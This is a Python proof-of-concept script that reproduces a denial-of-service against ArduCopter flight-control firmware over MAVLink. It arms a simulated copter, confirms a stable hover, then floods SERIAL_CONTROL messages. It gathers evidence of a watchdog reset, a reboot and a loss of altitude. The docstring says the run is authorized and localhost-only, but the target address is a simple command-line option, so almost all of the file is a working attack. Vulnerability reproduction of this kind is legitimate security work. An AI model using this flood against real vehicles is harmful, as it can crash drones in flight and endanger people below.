#!/usr/bin/env python3
"""Authorized, localhost-only ArduCopter DoS reproduction and evidence collection.

One MAVLink connection: arm, verify a stable hover, send SERIAL_CONTROL traffic,
then separately observe (1) firmware reboot, (2) IWDG underflow/reset evidence,
and (3) vehicle descent. Only corroborated watchdog reset + reboot is reported
as "DoS REPRODUCED"; a fall or reboot alone is INCONCLUSIVE.

For the reset log, run Athrill with stderr redirected to logs/athrill.err and
an athrill-device build that emits "IWDG_RESET: underflow cpu_clock=...".
"""
import argparse
import sys
import time
from pathlib import Path
from pymavlink import mavutil
from dos_oracle import classify, is_target_message

HERE = Path(__file__).resolve().parent
IWDG_MARKER = "IWDG_RESET: underflow cpu_clock="
HEARTBEAT_STALE_SEC = 3.0

ap = argparse.ArgumentParser(description="ArduCopter DoS test with explicit watchdog evidence")
ap.add_argument("--device", type=int, default=2)
ap.add_argument("--timeout-ms", type=int, default=3000)
ap.add_argument("--rate", type=float, default=20.0)
ap.add_argument("--attack-sec", type=float, default=15.0)
ap.add_argument("--watch-sec", type=float, default=10.0)
ap.add_argument("--watchdog-log", type=Path, default=HERE / "logs" / "athrill.err")
ap.add_argument("--url", default="tcp:127.0.0.1:5760")
args = ap.parse_args()

if not (0 <= args.device <= 9) or args.rate <= 0 or args.attack_sec < 0 or args.watch_sec < 0:
    ap.error("--device must be 0..9, --rate must be positive, and durations nonnegative")
if args.timeout_ms <= 0:
    ap.error("--timeout-ms must be positive")

DEVNUM = mavutil.mavlink.SERIAL_CONTROL_SERIAL0 + args.device
RESPOND = mavutil.mavlink.SERIAL_CONTROL_FLAG_RESPOND
ARMED_FLAG = mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED
EKF_NEEDED = (mavutil.mavlink.EKF_ATTITUDE | mavutil.mavlink.EKF_VELOCITY_HORIZ |
              mavutil.mavlink.EKF_VELOCITY_VERT | mavutil.mavlink.EKF_POS_HORIZ_ABS |
              mavutil.mavlink.EKF_POS_VERT_ABS)

try:
    m = mavutil.mavlink_connection(args.url, source_system=255)
    first_heartbeat = m.wait_heartbeat(timeout=60)
except (EOFError, OSError) as exc:
    print(f"INCONCLUSIVE: cannot establish MAVLink connection: {exc} (nothing attacked)",
          flush=True)
    sys.exit(2)
if first_heartbeat is None:
    print("INCONCLUSIVE: no ArduPilot heartbeat (nothing attacked)", flush=True)
    sys.exit(2)
target_system = first_heartbeat.get_srcSystem()
target_component = first_heartbeat.get_srcComponent()

last_gcs_hb = 0.0
last_fc_hb = None
alt = None
sim_time_ms = None
armed = False
positions = []        # (monotonic reception time, relative altitude)
reset_seen = False
watch_reset = False
link_failed = False
link_error = None


def record_link_failure(exc):
    global link_failed, link_error
    link_failed = True
    if link_error is None:
        link_error = str(exc)
        print(f"MAVLink link failed: {exc}", flush=True)


def keepalive():
    global last_gcs_hb
    now = time.monotonic()
    if now - last_gcs_hb >= 1.0:
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                             mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        for stream in (mavutil.mavlink.MAV_DATA_STREAM_POSITION,
                       mavutil.mavlink.MAV_DATA_STREAM_EXTENDED_STATUS):
            m.mav.request_data_stream_send(target_system, target_component, stream, 5, 1)
        m.mav.command_long_send(target_system, target_component,
                                mavutil.mavlink.MAV_CMD_SET_MESSAGE_INTERVAL,
                                0, 193, 500000, 0, 0, 0, 0, 0)
        last_gcs_hb = now


def receive(msg):
    global alt, sim_time_ms, armed, last_fc_hb, reset_seen
    if msg is None:
        return
    if not is_target_message(msg.get_srcSystem(), msg.get_srcComponent(),
                             target_system, target_component):
        return
    msg_type = msg.get_type()
    now = time.monotonic()
    if msg_type == "GLOBAL_POSITION_INT":
        alt = msg.relative_alt / 1000.0
        sim_time_ms = getattr(msg, "time_boot_ms", None)
        positions.append((now, alt))
    elif msg_type == "HEARTBEAT":
        armed = bool(msg.base_mode & ARMED_FLAG)
        last_fc_hb = now
    elif msg_type == "STATUSTEXT":
        print("AP:", msg.text, flush=True)
        if watch_reset and "Initialising ArduPilot" in msg.text:
            reset_seen = True


def pump(sec):
    until = time.monotonic() + sec
    while time.monotonic() < until and not link_failed:
        try:
            keepalive()
            receive(m.recv_match(blocking=True, timeout=0.2))
        except (EOFError, OSError) as exc:
            record_link_failure(exc)


def inconclusive(reason):
    print(f"INCONCLUSIVE: {reason} (attack not started)", flush=True)
    sys.exit(2)


print("waiting for EKF...", flush=True)
start = time.monotonic()
ekf_ok = False
while time.monotonic() - start < 120:
    try:
        keepalive()
        r = m.recv_match(type="EKF_STATUS_REPORT", blocking=True, timeout=1)
    except (EOFError, OSError) as exc:
        inconclusive(f"MAVLink lost while waiting for EKF: {exc}")
    if r is not None and is_target_message(
            r.get_srcSystem(), r.get_srcComponent(), target_system, target_component
    ) and (r.flags & EKF_NEEDED) == EKF_NEEDED and not (
            r.flags & mavutil.mavlink.EKF_CONST_POS_MODE):
        ekf_ok = True
        break
if not ekf_ok:
    inconclusive("EKF not ready")

try:
    m.set_mode("GUIDED")
except (EOFError, OSError) as exc:
    inconclusive(f"MAVLink lost while setting GUIDED mode: {exc}")
pump(1)
if link_failed:
    inconclusive(f"MAVLink lost before arming: {link_error}")
try:
    m.mav.command_long_send(target_system, target_component,
                            mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                            0, 1, 0, 0, 0, 0, 0)
except (EOFError, OSError) as exc:
    inconclusive(f"MAVLink lost while arming: {exc}")
pump(3)
if link_failed:
    inconclusive(f"MAVLink lost while arming: {link_error}")
if not armed:
    inconclusive("ArduPilot did not report ARMED")

try:
    m.mav.command_long_send(target_system, target_component,
                            mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
                            0, 0, 0, 0, 0, 0, 0, 2.5)
except (EOFError, OSError) as exc:
    inconclusive(f"MAVLink lost while requesting takeoff: {exc}")
print("taking off to 2.5 m...", flush=True)
start = time.monotonic()
while time.monotonic() - start < 40:
    pump(0.5)
    if link_failed:
        inconclusive(f"MAVLink lost during takeoff: {link_error}")
    if alt is not None and alt >= 2.2:
        break
if alt is None or alt < 2.2:
    inconclusive(f"takeoff altitude not reached (alt={alt})")

# A single altitude sample is not enough to prove a stable, armed hover.
hover_start = time.monotonic()
pump(4.0)
if link_failed:
    inconclusive(f"MAVLink lost while verifying hover: {link_error}")
hover_samples = [h for t, h in positions if t >= hover_start]
if not armed or len(hover_samples) < 5 or min(hover_samples) < 2.0 or (
        max(hover_samples) - min(hover_samples) > 0.5):
    inconclusive(f"hover not stable (armed={armed}, samples={len(hover_samples)})")
base_alt = sum(hover_samples) / len(hover_samples)
print(f"stable hover: {base_alt:.2f} m, samples={len(hover_samples)}", flush=True)

# Read *only* reset evidence written after the start of the attack.
log_path = args.watchdog_log.expanduser().resolve()
log_present_at_start = log_path.is_file()
log_offset = log_path.stat().st_size if log_present_at_start else 0
if not log_present_at_start:
    print(f"WARNING: watchdog evidence log not available: {log_path}", flush=True)

watch_reset = True
attack_start = time.monotonic()
attack_wall = time.time()
attack_sim_ms = sim_time_ms
print(f"attack started: wall={attack_wall:.3f} sim_boot_ms={attack_sim_ms}"
      f" device={args.device} (SERIAL{args.device})", flush=True)
interval = 1.0 / args.rate
next_send = attack_start
last_print = attack_start
sent = 0

while time.monotonic() - attack_start < args.attack_sec:
    now = time.monotonic()
    try:
        keepalive()
        if now >= next_send:
            m.mav.serial_control_send(DEVNUM, RESPOND, args.timeout_ms, 115200, 0, [0] * 70)
            sent += 1
            next_send = max(next_send + interval, now + interval)
        receive(m.recv_match(blocking=True, timeout=0.05))
    except (EOFError, OSError) as exc:
        record_link_failure(exc)
        break
    if now - last_print >= 1.0:
        print(f"  sent={sent} alt={alt} reboot={reset_seen}", flush=True)
        last_print = now

print("attack done; observing reset and descent...", flush=True)
pump(args.watch_sec)
watch_reset = False
after_attack_alts = [h for t, h in positions if t >= attack_start]
min_alt = min(after_attack_alts) if after_attack_alts else None
fell = min_alt is not None and min_alt < base_alt - 1.0

iwdg_lines = []
if log_path.is_file():
    try:
        with log_path.open("r", encoding="utf-8", errors="replace") as log_file:
            # The offset is valid for this run's append-only log; a file
            # truncated/replaced during the test cannot prove causality.
            size = log_path.stat().st_size
            if log_present_at_start and size < log_offset:
                print("WARNING: watchdog log was truncated during the test", flush=True)
            else:
                log_file.seek(log_offset)
                iwdg_lines = [line.strip() for line in log_file
                              if IWDG_MARKER in line]
    except OSError as exc:
        print(f"WARNING: cannot read watchdog evidence: {exc}", flush=True)

watchdog_seen = bool(iwdg_lines)
last_fc_age = (time.monotonic() - last_fc_hb) if last_fc_hb is not None else None
heartbeat_stale = last_fc_age is None or last_fc_age > HEARTBEAT_STALE_SEC
print(f"\nRESULT sent={sent} hover={base_alt:.2f}m min_alt={min_alt}"
      f" fall={fell} reboot={reset_seen} iwdg_reset={watchdog_seen}"
      f" link_failed={link_failed} heartbeat_stale={heartbeat_stale}"
      f" last_fc_heartbeat_age_sec={last_fc_age}", flush=True)
for line in iwdg_lines:
    print(f"  EVIDENCE: {line}", flush=True)

verdict = classify(sent, reset_seen, watchdog_seen, fell, link_failed, heartbeat_stale)
if verdict.exit_code == 0:
    print(f"*** DoS REPRODUCED: {verdict.label} ***", flush=True)
elif verdict.exit_code == 2:
    print(f"INCONCLUSIVE: {verdict.label}", flush=True)
else:
    print(f"NO EFFECT OBSERVED: {verdict.label}", flush=True)
sys.exit(verdict.exit_code)
